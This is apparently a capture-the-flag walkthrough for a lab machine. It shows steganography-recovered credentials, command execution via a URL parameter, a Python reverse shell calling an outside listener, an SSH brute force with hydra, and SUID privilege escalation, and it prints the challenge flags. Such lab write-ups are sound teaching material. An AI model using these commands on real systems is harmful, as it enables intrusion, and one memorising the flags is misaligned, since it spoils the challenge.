# JACK OF ALL TRADE

## BASIC INFO
```
export IP=10.10.112.230

open port:
	22	http
	80	ssh
```


Found images on homepage with name stego.
Also a base64 encoded string which translates to the following.
```
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

Using steghide on stego.jpg returns creds.txt that says we're on the right path but wrong image.

Using steghide on header.jpg gives us cms.creds.
```
Username: jackinthebox
Password: TplFxiSHjY
```

On /recovery.php found a weird string. Not base64, maybe base32? Remember him mentioning Johny Graves on homepage before. Try searching for him.\
Johny Graves twitter.
```
encode msg with ROT13 then hex then base32
```

It just leads us back to homepage...

Log in on /recovery.php with the credentials we found with steghide.

It says give me cmd... RCE?\
/recovery.php?cmd=id really does print out the output of id.

Reverse shell time.
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.7.208",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

once we logged in, navigate to /.\
There's a jacks_password_list. Copy that down and use hydra to bruteforce ssh.

```
hydra -l jack -P passwords.txt -u ssh://$IP:80
```

ssh
```
username:jack
password:ITMJpGGIqg1jn?>@
```

Using scp to download user.jpg.`scp -P 80 jack@$IP:user.jpg .`

> - **User Flag**
>> securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}


> - **Root Flat**
>> securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}

Exploiting the SUID file again. `find / -perm /4000 2>/dev/null` and we found strings can be run as root. `strings /root/root.txt` gives us the flag.